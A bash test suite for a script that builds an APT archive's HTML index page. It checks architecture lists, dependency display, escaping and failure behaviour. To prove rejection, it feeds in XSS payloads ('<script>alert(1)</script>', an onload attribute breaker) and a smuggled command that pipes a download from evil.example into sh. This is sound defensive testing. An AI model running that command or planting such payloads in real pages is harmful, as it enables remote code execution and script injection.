#!/usr/bin/env bash
#
# Tests for scripts/build-index-page.sh, the page served at the archive root.
#
# It is the only part of the archive that reaches a browser, and the package
# names it embeds come from each `.deb`'s control field. `publish.yml` states
# the assumption those rest on: the release assets are attacker-influenced,
# because whoever can publish a product release controls them. `verify-debs.sh`
# binds each `.deb` to the product that released it, which bounds the problem
# but does not make the strings safe to interpolate into HTML.
#
# The architecture line matters for a different reason: it used to be prose, and
# was a fifth place the architecture list lived that the product context never
# counted. It is derived now, and these cases are what keeps it derived.
#
# No gpg and no reprepro: this reads a synthetic index and writes HTML.
#
# Requires: bash 4+.

set -euo pipefail

# This file runs under `set -e`, so a `grep` that finds nothing kills it where
# it stands. That is usually right, and it makes a truncated run look like a
# small one: on 2026-08-29 an edit removed content one grep looked for, the run
# died at that line, and the summary read "1 failed" while seven later
# assertions had never been reached. Nothing in the output said so.
#
# Two wrong shapes were tried before this one, and both are worth naming because
# each looks correct. Putting the guard at the END of the file cannot work: the
# end is exactly what a dying script never reaches. Counting `^check` lines in
# the source and comparing does not work either, because assertions inside a
# loop run more often than they appear, so the count is not a total and a
# comparison against it stays quiet for any death past the first few cases.
#
# A sentinel does work, because it asks the only question that has an exact
# answer: did control reach the last line.
reached_end=0

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
BUILD="$HERE/scripts/build-index-page.sh"
WORK="$(mktemp -d)"

# One handler, not two. A second `trap ... EXIT` replaces the first rather than
# adding to it, and that is exactly how the first version of this guard came to
# do nothing: it was registered above and then silently dropped by the cleanup
# trap twenty lines later. Both jobs live here.
cleanup() {
	rm -rf "$WORK"
	if [ "$reached_end" -eq 0 ]; then
		echo >&2
		echo "INCOMPLETE  the run stopped before the end of this file." >&2
		echo "            A command failed under set -e, so any counts printed" >&2
		echo "            above describe a fraction of the assertions here." >&2
	fi
}
trap cleanup EXIT

pass=0
fail=0

check() { # <description> <expected> <actual>
	if [ "$2" = "$3" ]; then
		echo "ok    $1"
		pass=$((pass + 1))
	else
		echo "FAIL  $1"
		echo "        expected: $2"
		echo "        actual:   $3"
		fail=$((fail + 1))
	fi
}

# A synthetic archive laid out the way reprepro leaves one. Only the fields the
# page reads are populated.
archive() { # $1=dir $2=arch list ("-" for a Release with no Architectures) $3...=package names
	local dir="$1" arches="$2"; shift 2
	local arch pkg
	rm -rf "$dir"; mkdir -p "$dir/dists/stable"
	{
		echo "Origin: Glyndor"
		[ "$arches" = "-" ] || echo "Architectures: $arches"
		echo "Components: main"
	} > "$dir/dists/stable/Release"

	[ "$arches" = "-" ] && arches="amd64"
	for arch in $arches; do
		mkdir -p "$dir/dists/stable/main/binary-$arch"
		: > "$dir/dists/stable/main/binary-$arch/Packages"
		for pkg in "$@"; do
			# "name@dep, dep" attaches a Depends line. The separator is `@`
			# because it appears in neither a package name nor Debian
			# dependency syntax, so it cannot collide with what is being tested.
			if [ "${pkg#*@}" != "$pkg" ]; then
				printf 'Package: %s\nVersion: 1.0\nDepends: %s\n\n' \
					"${pkg%%@*}" "${pkg#*@}" \
					>> "$dir/dists/stable/main/binary-$arch/Packages"
			else
				printf 'Package: %s\nVersion: 1.0\n\n' "$pkg" \
					>> "$dir/dists/stable/main/binary-$arch/Packages"
			fi
		done
		printf 'Package: glyndor-archive-keyring\nVersion: 1.0\n\n' \
			>> "$dir/dists/stable/main/binary-$arch/Packages"
	done
}

run() { # $1=dir
	"$BUILD" "$1" > "$WORK/out" 2>&1
}

# --- today's archive --------------------------------------------------------

archive "$WORK/a" "amd64 arm64" podup
rc=0; run "$WORK/a" || rc=$?
check "a normal archive builds a page" "0" "$rc"
P="$WORK/a/index.html"
check "the architectures come from the Release" "1" \
	"$(grep -c 'Debian/Ubuntu (amd64, arm64)' "$P")"
check "one install entry per product" "1" \
	"$(grep -o '<li><code>curl -fsSL https://apt.glyndor.net/install/podup | sudo sh</code>' "$P" | wc -l)"
# Match the markup, not the word: the prose lower down uses "requires" and
# "takes" for the same idea, and a bare word match would answer about the
# paragraph rather than about the list.
check "a package with no dependencies gets no requirements clause" "0" \
	"$(grep -c '<span>needs' "$P")"
check "the keyring is not offered as a product install" "0" \
	"$(grep -c 'install/glyndor-archive-keyring' "$P")"
# The page and README.md are read by the same person. README.md tells them not
# to install with apt, because only the script brings unattended-upgrades onto
# the machine; a page that still offered `apt install` would contradict it in
# the more visible of the two places. This is what keeps them from drifting.
check "the page does not offer apt install anywhere" "0" \
	"$(grep -c 'apt install' "$P")"

# --- it follows the index rather than a hardcoded list ----------------------

archive "$WORK/b" "amd64 arm64 armhf" podup helmly epistle unitpm
rc=0; run "$WORK/b" || rc=$?
check "a third architecture appears without a code change" "1" \
	"$(grep -c 'Debian/Ubuntu (amd64, arm64, armhf)' "$WORK/b/index.html")"
# The list is emitted on one line, so count occurrences rather than lines --
# grep -c would answer 1 however many products there are.
check "every product gets an entry" "4" \
	"$(grep -o '<li><code>curl -fsSL https://apt.glyndor.net/install/' "$WORK/b/index.html" | wc -l)"
check "and each appears once despite three indices declaring it" "1" \
	"$(grep -o 'install/helmly | sudo sh<' "$WORK/b/index.html" | wc -l)"

# --- what the reader has to supply ------------------------------------------
#
# The page promised "Debian/Ubuntu" with nothing else, and that is the sentence
# somebody acts on. It is not true of most of Debian and Ubuntu: podup 5.9.1
# declares `podman (>= 5.0)`, Ubuntu 24.04 LTS ships 4.9.3 with no backport, so
# the archive adds cleanly there and the install cannot complete.
#
# Only the requirement is asserted here, never a list of releases that satisfy
# it. A release list would be a claim about the world that nothing in this
# repository can falsify.

archive "$WORK/e" "amd64" 'podup@podman (>= 5.0), unattended-upgrades, glyndor-archive-keyring' \
	'epistle@glyndor-archive-keyring, adduser'
rc=0; run "$WORK/e" || rc=$?
check "an archive declaring dependencies builds a page" "0" "$rc"
E="$WORK/e/index.html"

check "a version-constrained requirement is shown with the package" "1" \
	"$(grep -o 'install/podup | sudo sh</code> <span>needs <code>podman (&gt;= 5.0)</code>' "$E" | wc -l)"
check "an unconstrained one is shown too" "1" \
	"$(grep -o '<code>unattended-upgrades</code>' "$E" | wc -l)"
check "each package gets its own requirements, not the archive's" "1" \
	"$(grep -o 'install/epistle | sudo sh</code> <span>needs <code>adduser</code></span>' "$E" | wc -l)"

# A dependency on something this archive serves is resolved by apt from here, so
# it is not the reader's to supply. Derived from the index rather than from a
# list of our own names, which is what keeps it true as the roster grows.
check "a dependency this archive serves is not listed as a requirement" "0" \
	"$(grep -c 'needs <code>glyndor-archive-keyring' "$E")"

# The escaping, asserted on the exact bytes rather than on "no angle bracket".
# `&` in the replacement half of a bash substitution expands to the text that
# just matched, the way sed does, so the first version of html_escape turned
# `(>= 5.0)` into `(>gt;= 5.0)`: entity broken, bracket still there. Both halves
# have to be checked or that output passes a test looking only for `&gt;`.
check "a version relation is escaped as an entity" "1" \
	"$(grep -c '&gt;= 5.0' "$E")"
check "and no raw bracket survives in it" "0" \
	"$(grep -c '>gt;\|(>= 5.0)' "$E")"

check "the page says adding the archive is not the same as installing" "1" \
	"$(grep -c 'can add the' "$E")"

archive "$WORK/f" "amd64" 'podup@libevil (<< 1.0) <script>alert(1)</script>'
rc=0; run "$WORK/f" || rc=$?
check "a hostile dependency does not stop the build" "0" "$rc"
check "it is skipped with a warning naming the package" "1" \
	"$(grep -c 'skipping unexpected dependency of podup' "$WORK/out")"
check "and no script tag reaches the page" "0" \
	"$(grep -c '<script' "$WORK/f/index.html")"

# --- the strings reach a browser --------------------------------------------

archive "$WORK/c" "amd64" podup '<script>alert(1)</script>'
rc=0; run "$WORK/c" || rc=$?
check "a hostile package name does not stop the build" "0" "$rc"
check "it is skipped with a warning" "1" \
	"$(grep -c 'skipping unexpected package name' "$WORK/out")"
check "and NO script tag reaches the page" "0" \
	"$(grep -c '<script' "$WORK/c/index.html")"
check "while the legitimate package still renders" "1" \
	"$(grep -o 'install/podup | sudo sh<' "$WORK/c/index.html" | wc -l)"

archive "$WORK/d" "amd64" 'pod"up onload=x' podup
rc=0; run "$WORK/d" || rc=$?
check "an attribute-breaking name is skipped too" "1" \
	"$(grep -c 'skipping unexpected package name' "$WORK/out")"
check "and no stray quote reaches the list" "0" \
	"$(grep -c 'onload' "$WORK/d/index.html")"

# --- fail closed rather than serve something wrong --------------------------

archive "$WORK/e" "-" podup
rc=0; run "$WORK/e" || rc=$?
check "a Release with no Architectures fails" "1" "$rc"
check "and says why" "1" "$(grep -c 'declares no architectures' "$WORK/out")"
check "and writes no page" "0" "$(find "$WORK/e" -name index.html | wc -l)"

archive "$WORK/f" "amd64"
rc=0; run "$WORK/f" || rc=$?
check "an index carrying only the keyring fails" "1" "$rc"
check "and says why" "1" "$(grep -c 'declare no installable packages' "$WORK/out")"

rc=0; "$BUILD" >/dev/null 2>&1 || rc=$?
check "no argument is a usage error" "2" "$rc"

rc=0; "$BUILD" "$WORK/does-not-exist" >/dev/null 2>&1 || rc=$?
check "a missing archive fails rather than writing a page" "1" "$rc"

# --- the architectures line also reaches a browser --------------------------
# Symmetric to the package-name check above: Architectures is interpolated
# into the served HTML on the "Set up on Debian/Ubuntu (...)" line, and the
# bytes come from the signed Release, same threat model. A signed
# `Architectures: <script>alert("xss")</script>` would land in the page
# without this check. The audit (`auditoria-tests-canales.md`, Hallazgo 3)
# demonstrated the injection manually; the cases below pin the fix.

archive "$WORK/g" '<script>alert("xss")</script>' podup
rc=0; run "$WORK/g" || rc=$?
check "a hostile Architectures value fails closed" "1" "$rc"
check "and says why" "1" "$(grep -c 'Architectures field contains unexpected characters' "$WORK/out")"
check "and writes no page" "0" "$(find "$WORK/g" -name index.html | wc -l)"

archive "$WORK/h" 'amd64; curl evil.example/x | sh' podup
rc=0; run "$WORK/h" || rc=$?
check "an attribute-breaking Architectures value is rejected" "1" "$rc"
check "and no script tag reaches the page" "0" "$(find "$WORK/h" -name index.html 2>/dev/null | wc -l)"

# --- the page must not tell people to install before checking ---------------
#
# `dpkg -i` runs the package's maintainer scripts as root. The bootstrap block
# the page publishes is a manual path around scripts/install-template.sh, so it
# has to carry the same order: extract, read the fingerprint, only then install.

archive "$WORK/i" "amd64" podup
rc=0; run "$WORK/i" || rc=$?
check "the archive builds a page" "0" "$rc"
P="$WORK/i/index.html"
# The README is a separate host, so a compromised archive cannot vouch for its
# own key. Losing that link would turn the check into a self-attestation.
check "the fingerprint is still compared against an independent channel" "1" \
	"$(grep -c 'github.com/Glyndor/apt#verify-the-signing-key' "$P")"

# --- the package list must not depend on the machine's collation ------------
#
# `sort -u` compares by the locale's collation, and UTF-8 collations ignore
# punctuation at the primary level: `pod-up` and `podup` are both legal Debian
# names, and under en_US.UTF-8 they compare EQUAL, so one of them is dropped
# from the page without a word. The runner's locale is not the user's, so this
# has to be pinned rather than left to the environment.

check "the package list is sorted under a fixed collation" "1" \
	"$(grep -c 'LC_ALL=C sort -u' "$BUILD")"

# The static check above catches a removal; this one catches the behaviour. It
# needs a locale that actually collapses the two names, which not every machine
# has -- when none does, say so rather than counting a pass nothing verified.
collapsing_locale=""
for loc in en_US.UTF-8 en_GB.UTF-8 de_DE.UTF-8 fr_FR.UTF-8; do
	locale -a 2>/dev/null | grep -qix "${loc/UTF-8/utf8}" || continue
	[ "$(printf 'pod-up\npodup\n' | LC_ALL="$loc" sort -u | wc -l)" -eq 1 ] || continue
	collapsing_locale="$loc"; break
done
if [ -n "$collapsing_locale" ]; then
	archive "$WORK/j" "amd64" pod-up podup
	rc=0; LC_ALL="$collapsing_locale" run "$WORK/j" || rc=$?
	check "a page still builds under $collapsing_locale" "0" "$rc"
	# Both <li> land on one line, so count matches, not lines.
	check "both names survive a collation that treats them as equal" "2" \
		"$(grep -o '<li><code>curl -fsSL [^<]*install/pod[a-z-]* | sudo sh</code></li>' \
			"$WORK/j/index.html" | wc -l | tr -d ' ')"
else
	echo "NOTE  no locale here collapses 'pod-up' and 'podup';"
	echo "      the behavioural half of the collation check did not run"
fi

reached_end=1

echo
echo "$pass passed, $fail failed"
printf 'DONE %s %d %d\n' "${BASH_SOURCE[0]##*/}" "$pass" "$fail"
[ "$fail" -eq 0 ]
